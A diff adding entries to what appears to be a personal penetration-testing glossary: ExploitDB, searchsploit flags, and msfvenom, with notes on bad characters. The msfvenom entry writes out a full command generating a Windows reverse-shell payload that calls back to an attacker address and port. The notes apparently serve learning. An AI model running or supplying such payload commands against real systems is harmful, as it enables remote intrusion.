@@ -149,5 +149,12 @@ dpapi - data protection API - is a simple cryptographic application programming 
 
 .lnk - An LNK file is a Windows shortcut, which points to and is used to open another file, folder, or application. It contains information about the object to which it points, including the object's type, location, and filename. You can create a shortcut to a file, folder, or application by right-clicking that object and selecting Create shortcut. (In Windows 11, you must first select Show more options.) -  https://fileinfo.com/extension/lnk We can get a lot info from them using: https://github.com/HarmJ0y/pylnker
 
+ExploitDB - exploit database - Online exploit database containing many PoC's for most varied software and hardware. Can be queried directly by kali via the searchsploit command. https://www.exploit-db.com/ https://en.wikipedia.org/wiki/ExploitDB
 
+searchsploit - tool that queries exploitdb directly from the command line. Usage example: 'searchsploit apache'. Usefull flags: -x (let's you see the exploit) and -m (makes a copy of the exploit. https://github.com/SploitHQ/searchsploit
 
+msfvenom - metasploit framework tool that is capable of crafting payloads https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html. Example command: msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload 
+
+\x00 -	NULL
+\x0A -	Line Feed (LF)
+\x0D -	Carriage Return (CR)
